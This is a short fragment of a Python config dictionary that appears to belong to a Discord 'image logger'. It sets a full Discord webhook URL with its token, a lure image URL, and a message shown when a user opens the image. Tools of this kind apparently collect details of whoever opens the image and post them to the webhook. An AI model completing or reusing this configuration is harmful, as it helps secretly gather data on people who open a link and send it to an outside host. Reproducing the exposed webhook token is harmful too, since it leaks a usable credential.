...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1358104659180392708/O7jjwBAWQhK10SWL2QajxcXX5D4huEJg7iF2vq3eu_opla6JPrCqL2gSFquSJ-eBxeUc",
    "image": "https://gcdnb.pbrd.co/images/R0l52eH9eO2x.png", # You can also have a custom image by using a URL argument
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "screenshot", # Message to show
